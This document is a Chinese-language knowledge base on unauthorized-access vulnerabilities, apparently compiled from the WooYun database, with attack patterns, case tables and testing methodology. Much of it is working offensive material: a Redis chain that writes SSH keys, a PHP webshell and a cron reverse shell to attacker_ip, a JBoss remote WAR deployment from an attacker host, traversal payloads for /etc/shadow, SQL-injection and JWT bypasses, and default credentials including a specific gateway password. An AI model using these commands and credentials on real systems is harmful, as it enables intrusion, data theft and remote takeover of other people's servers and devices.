# 未授权访问漏洞分析知识库

> 基于WooYun漏洞库88,636个漏洞中的14,377个未授权访问相关漏洞提炼

---

## 1. 核心统计数据

| 指标 | 数值 |
|------|------|
| 总漏洞数 | 88,636 |
| 未授权访问相关 | 14,377 (16.2%) |
| 深度分析样本 | 100 |

---

## 2. 未授权访问类型分类

### 2.1 后台未授权访问 (Backend Unauthorized Access)

**统计**: 22个典型案例

**攻击模式**:

| 模式类型 | 描述 | 典型案例 |
|----------|------|----------|
| 硬编码认证绕过 | 固定密钥/参数解密后直接登录 | 赣企建站系统 `lstate=515csmxSi1aTO9ysxvJ1Gpmnj7hHuPxjMdfZdEP49lJZ` |
| 弱口令/默认口令 | admin/admin, weblogic/12345678 | 58同城 Tomcat `admin:admin123456` |
| 路径直接访问 | 后台URL无认证 | 中国信鸽网 `/Users/AssociationManage/` |
| 认证逻辑缺陷 | 前端验证、验证码绕过 | 58赶集 验证码前端刷新可爆破 |

**典型绕过技术**:

```
# 1. 参数加密绕过
/admin/login.asp?lstate={encrypted_true_value}

# 2. 直接路径访问
/console/login/LoginForm.jsp  (WebLogic)
/manager/html               (Tomcat)
/jmx-console/               (JBoss)

# 3. 目录base64编码
/ZmptY2NtYW5hZ2Vy/  (base64解码后为管理路径)
```

**关键洞察**:
- 大量系统使用统一的加密密钥，导致所有部署实例可被同一方法绕过
- 开发框架默认配置通常存在弱口令
- 内部系统往往忽略认证，仅依赖网络隔离

---

### 2.2 API未授权访问

**统计**: 7个典型案例

**攻击向量**:

| 向量 | 描述 | 实例 |
|------|------|------|
| 接口无认证 | API直接返回敏感数据 | 某公众号平台 `/api/configs` 返回AppID和AppSecret |
| 权限校验缺失 | 仅验证登录不验证权限 | 人人网相册接口 `uid=`参数可遍历 |
| 敏感信息泄露 | 调试接口暴露 | `/api/v1/admin_is_login` 判断逻辑暴露 |

**API探测Payload示例**:

```bash
# 常见敏感API路径
/api/configs
/api/v1/admin_is_login
/api/users
/api/debug
/swagger-ui.html
/api-docs
/actuator/env
/actuator/health
```

---

### 2.3 数据库服务未授权

**统计**: 5个典型案例

**常见未授权数据库服务**:

| 服务 | 默认端口 | 危害级别 | 利用方式 |
|------|----------|----------|----------|
| MongoDB | 27017 | 严重 | 无认证直接连接，可导出全部数据 |
| Redis | 6379 | 严重 | 写SSH公钥、写Webshell、写计划任务 |
| MySQL | 3306 | 高 | 空密码或弱密码连接 |
| Memcached | 11211 | 中 | 数据泄露、DDoS放大 |
| Elasticsearch | 9200 | 高 | 读取索引数据、远程代码执行 |

**Redis未授权利用链**:

```bash
# 连接
redis-cli -h target_ip

# 查看信息
info

# 写SSH公钥
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# 写Webshell (需知道web目录)
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save

# 写计划任务
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/attacker_ip/port 0>&1\n"
save
```

**MongoDB未授权探测**:

```bash
# 连接测试
mongo target_ip:27017

# 列出数据库
show dbs

# 查看集合
use database_name
show collections

# 导出数据
mongoexport -h target_ip -d db_name -c collection -o output.json
```

---

### 2.4 缓存服务未授权

**统计**: 10个典型案例

| 服务 | 端口 | 验证命令 | 影响 |
|------|------|----------|------|
| Redis | 6379 | `redis-cli -h IP info` | 数据泄露、RCE |
| Memcached | 11211 | `echo "stats" \| nc IP 11211` | 数据泄露、DDoS |

---

### 2.5 中间件未授权

**统计**: 19个典型案例

**中间件漏洞矩阵**:

| 中间件 | 未授权入口 | 利用方式 | 典型漏洞 |
|--------|------------|----------|----------|
| WebLogic | `/console/` | 部署WAR包 | CVE-2017-10271, CVE-2019-2725 |
| JBoss | `/jmx-console/` | 远程部署 | JMXInvokerServlet反序列化 |
| Tomcat | `/manager/html` | 部署WAR包 | 弱口令 + 上传 |
| Resin | `/resin-admin/` | 远程部署 | 配置不当 |
| Spring Boot | `/actuator/` | 信息泄露/RCE | Heapdump泄露、env泄露 |

**WebLogic弱口令列表**:

```
weblogic / weblogic
weblogic / weblogic1
weblogic / weblogic123
weblogic / 12345678
system / password
```

**JBoss JMX-Console利用**:

```
1. 访问 /jmx-console/
2. 找到 jboss.deployment
3. 部署远程WAR: http://attacker/shell.war
```

---

### 2.6 DevOps工具未授权

**统计**: 2个典型案例

| 工具 | 默认端口 | 风险 |
|------|----------|------|
| Jenkins | 8080 | Script Console RCE |
| Zabbix | 80 | SQL注入 -> Session劫持 |
| Grafana | 3000 | 未授权数据源访问 |
| Kibana | 5601 | 数据查看、RCE |

**Jenkins Script Console**:

```groovy
// Groovy代码执行
def cmd = "whoami"
println cmd.execute().text
```

---

### 2.7 IoT设备未授权

**统计**: 7个典型案例

| 设备类型 | 默认凭证 | 危害 |
|----------|----------|------|
| 摄像头 | admin/admin, admin/12345 | 视频监控泄露 |
| 路由器 | admin/admin | 网络控制 |
| 打印机 | 无密码telnet | 配置修改 |
| 家庭网关 | telecomadmin/nE7jA%5m | 网络接管 |

**典型案例 - 电信家庭网关**:
- 默认超级管理员: `telecomadmin/nE7jA%5m`
- 远程80端口开放
- 密码固化无法修改

---

## 3. 权限绕过方法

### 3.1 参数篡改 (Parameter Manipulation)

**统计**: 8个典型案例

**技术要点**:

```
# 1. ID遍历
/user/info?uid=1
/user/info?uid=2
...

# 2. 角色篡改
role=user -> role=admin

# 3. 权限标识篡改
isAdmin=0 -> isAdmin=1
```

---

### 3.2 路径绕过 (Path Bypass)

**统计**: 34个典型案例

**绕过技术**:

```
# 1. 目录遍历
../../../etc/passwd
..\..\..\..\windows\system.ini

# 2. URL编码绕过
%2e%2e%2f  (../)
%252e%252e%252f  (双重编码)

# 3. 空字节截断
../../../etc/passwd%00.jpg

# 4. 大小写混淆
/ADMIN/
/Admin/
/aDmIn/
```

---

### 3.3 认证绕过 (Authentication Bypass)

**统计**: 19个典型案例

**技术分类**:

| 类型 | 描述 | Payload示例 |
|------|------|-------------|
| 万能密码 | SQL注入登录 | `' or 1=1--` |
| Cookie伪造 | 修改认证Cookie | `admin=true` |
| JWT绕过 | 空算法/弱密钥 | `alg: none` |
| Session劫持 | 预测/窃取Session | Session ID泄露后直接利用 |

---

### 3.4 Session绕过

**统计**: 3个典型案例

**利用场景**:

```
# 1. Session ID泄露 (日志泄露)
/logs/ctp.log -> 包含Session ID

# 2. Session固定攻击
强制用户使用攻击者指定的Session ID

# 3. Session预测
时间戳/顺序号生成的弱Session
```

---

### 3.5 Header绕过

**统计**: 13个典型案例

**常用绕过Header**:

```
X-Forwarded-For: [IP已脱敏]
X-Real-IP: [IP已脱敏]
X-Originating-IP: [IP已脱敏]
X-Remote-IP: [IP已脱敏]
X-Remote-Addr: [IP已脱敏]
X-Client-IP: [IP已脱敏]
Host: localhost
Referer: https://example.com/[已脱敏]
```

---

## 4. IDOR越权漏洞

### 4.1 水平越权 (Horizontal Privilege Escalation)

**统计**: 4个典型案例

**特征**: 同级用户间的数据越权访问

**案例分析**:

| 案例 | 漏洞点 | 影响 |
|------|--------|------|
| 大特保 | `/personal/center/family/{id}/edit` | 数十万被保人信息泄露 |
| 龙珠网 | 房间ID可替换 | 修改他人直播间信息 |
| 找对象App | uid参数可篡改 | 修改任意用户爱情宣言 |

**测试方法**:

```
1. 记录正常请求中的ID参数
2. 替换为其他用户的ID
3. 观察响应是否返回其他用户数据
4. 自动化遍历 (Burp Intruder)
```

---

### 4.2 ID枚举 (ID Enumeration)

**统计**: 27个典型案例

**枚举技术**:

```python
# 自动化ID遍历脚本
import requests

for user_id in range(1, 10000):
    url = f"http://target/api/user/{user_id}"
    resp = requests.get(url)
    if resp.status_code == 200:
        print(f"Found: {user_id} - {resp.text[:100]}")
```

**典型案例**:

| 系统 | 枚举点 | 数据量 |
|------|--------|--------|
| 全峰快递 | 订单ID | 2010年至今大量订单 |
| 一嗨租车 | 发票ID | 19万数据 |
| 中粮集团OA | 员工ID | 大量员工信息 |

---

## 5. 常见未授权服务

### 5.1 服务统计

| 服务 | 案例数 | 端口 | 风险等级 |
|------|--------|------|----------|
| WebLogic | 10 | 7001 | 严重 |
| JBoss | 7 | 8080 | 严重 |
| Redis | 5 | 6379 | 严重 |
| MySQL | 5 | 3306 | 高 |
| rsync | 5 | 873 | 高 |
| MongoDB | 4 | 27017 | 严重 |
| Spring Actuator | 2 | 8080 | 高 |
| Zabbix | 2 | 80 | 中 |

### 5.2 服务识别指纹

```bash
# Redis
redis-cli -h IP info

# MongoDB
mongo IP:27017 --eval "db.version()"

# Elasticsearch
curl http://IP:9200

# rsync
rsync IP::

# Memcached
echo "stats" | nc IP 11211

# ZooKeeper
echo "stat" | nc IP 2181

# Docker Remote API
curl http://IP:2375/info
```

### 5.3 rsync未授权利用

**案例**: 某社交平台某社交平台、赛迪网

```bash
# 列出模块
rsync target_ip::

# 下载文件
rsync -avz target_ip::module_name ./local_dir

# 上传文件 (如有写权限)
rsync -avz ./local_file target_ip::module_name/
```

**影响**: 整站源码泄露、配置文件泄露、敏感信息暴露

---

## 6. 目录遍历技巧

**统计**: 35个典型案例

### 6.1 基础Payload

```
# Linux
../../../etc/passwd
../../../etc/shadow
../../../root/.bash_history
../../../proc/self/environ

# Windows
..\..\..\..\windows\system.ini
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
```

### 6.2 编码绕过

```
# URL编码
%2e%2e%2f = ../
%2e%2e/ = ../
..%2f = ../
%2e%2e%5c = ..\

# 双重编码
%252e%252e%252f = ../

# UTF-8编码
..%c0%af = ../
..%c1%9c = ..\

# 空字节截断
../../../etc/passwd%00.jpg
```

### 6.3 典型案例

| 案例 | Payload | 结果 |
|------|---------|------|
| 华云数据 | `?urlParam=../../../WEB-INF/web.xml%3f` | 配置文件泄露 |
| 某家电厂商 | `upload.aspx?id=8&dir=../../../../` | 目录浏览+任意删除 |
| 某政府网站 | `down.php?dd=../down.php` | 源码下载 |
| 某社交平台某社交平台 | `curl IP:8888/../../../etc/shadow` | 系统文件读取 |

### 6.4 自动化测试

```bash
# 使用dotdotpwn
dotdotpwn -m http -h target -x 8080 -f /etc/passwd

# 使用wfuzz
wfuzz -c -z file,traversal.txt --hc 404 http://target/download.php?file=FUZZ
```

---

## 7. 元思考方法论

### 7.1 未授权访问检测流程

```
1. 信息收集
   ├── 端口扫描 (nmap)
   ├── 服务识别 (指纹识别)
   └── 路径枚举 (dirsearch)

2. 服务探测
   ├── 数据库服务 (6379, 27017, 3306, 9200)
   ├── 中间件管理端 (7001, 8080)
   ├── 监控服务 (3000, 5601)
   └── 文件服务 (873, 21)

3. 认证测试
   ├── 默认凭证尝试
   ├── 弱口令爆破
   └── 认证绕过测试

4. 权限验证
   ├── 垂直越权 (普通->管理员)
   ├── 水平越权 (用户A->用户B)
   └── 接口权限 (API鉴权)

5. 漏洞利用
   ├── 数据窃取
   ├── 权限提升
   └── 横向移动
```

### 7.2 关键洞察

1. **架构层面**: 内网服务暴露公网是未授权访问的主要原因
2. **配置层面**: 默认配置、弱口令是最常见的攻击入口
3. **开发层面**: 权限校验仅在前端或仅验证登录状态
4. **运维层面**: 调试接口、管理接口未关闭或未设置ACL

### 7.3 关键洞察

1. **架构层面**: 内网服务暴露公网是未授权访问的主要原因
2. **配置层面**: 默认配置、弱口令是最常见的攻击入口
3. **开发层面**: 权限校验仅在前端或仅验证登录状态
4. **运维层面**: 调试接口、管理接口未关闭或未设置ACL

---

## 8. 快速参考卡

### 8.1 常见未授权服务检测命令

```bash
# 批量扫描常见未授权端口
nmap -sV -p 6379,27017,9200,11211,2181,2379,873,21 target

# Redis
redis-cli -h target info

# MongoDB
mongo target:27017 --eval "db.adminCommand('listDatabases')"

# Elasticsearch
curl -s http://target:9200/_cat/indices

# rsync
rsync --list-only rsync://target/

# Docker
curl http://target:2375/containers/json
```

### 8.2 Web中间件默认路径

```
# Tomcat
/manager/html
/manager/status
/host-manager/html

# WebLogic
/console/
/wls-wsat/

# JBoss
/jmx-console/
/web-console/
/invoker/JMXInvokerServlet

# Spring Boot Actuator
/actuator/env
/actuator/health
/actuator/heapdump
/actuator/mappings
```

---

## 9. 实战案例分析

### 9.1 案例背景

**漏洞编号**: wooyun-2015-0108547
**漏洞标题**: 某监控设备未授权访问
**漏洞类型**: 未授权访问/权限绕过
**危害等级**: 高
**漏洞详情**: 直接访问后台管理页面无需认证
**利用方式**: 访问 `/admin/index.jsp` 直接进入管理后台

### 9.2 认证缺失代码模式

```
# 错误示例: 未做认证检查
@app.route('/admin/index.jsp')
def admin_panel():
    return render_template('admin.html')  # 直接返回管理界面
```

### 9.3 监控设备未授权访问攻击面矩阵

| 攻击向量 | 默认路径 | 典型危害 | 检测方法 |
|----------|----------|----------|----------|
| 管理后台 | `/admin/index.jsp` | 设备完全控制 | 直接访问 |
| 视频流 | `/mjpg/video.mjpg` | 监控视频泄露 | VLC播放器打开 |
| 配置文件 | `/config.ini` | 账号密码泄露 | curl下载 |
| 日志文件 | `/logs/` | 内部信息泄露 | 路径遍历 |
| 固件下载 | `/firmware/` | 固件逆向分析 | 枚举目录 |
| RTSP流 | `rtsp://ip:554/stream` | 实时视频泄露 | ffplay播放 |

### 9.4 测试方法论

#### 9.4.1 监控设备未授权访问检测流程

```mermaid
graph TD
    A[发现目标IP] --> B[端口扫描识别设备类型]
    B --> C{识别Web服务?}
    C -->|是| D[枚举常见管理路径]
    C -->|否| E[探测RTSP/ONVIF协议]
    D --> F{返回管理界面?}
    F -->|是| G[尝试默认凭证]
    F -->|否| H[测试路径遍历]
    G --> I{登录成功?}
    I -->|是| J[标记未授权/弱口令]
    I -->|否| K[测试认证绕过]
    E --> L{RTSP未授权?}
    L -->|是| M[标记视频流泄露]
    J --> N[生成测试报告]
    K --> N
    M --> N
    H --> N
```

### 9.5 监控设备漏洞利用链

```mermaid
graph LR
    A[未授权访问管理后台] --> B[获取设备配置信息]
    B --> C[发现内网其他设备]
    C --> D[横向移动]
    A --> E[修改网络配置]
    E --> F[DNS劫持]
    A --> G[开启远程调试]
    G --> H[植入后门]
    A --> I[导出录像]
    I --> J[隐私泄露/勒索]
```

---

*文档版本: 1.1*
*最后更新: 2026-01-23*
*数据来源: WooYun漏洞库*
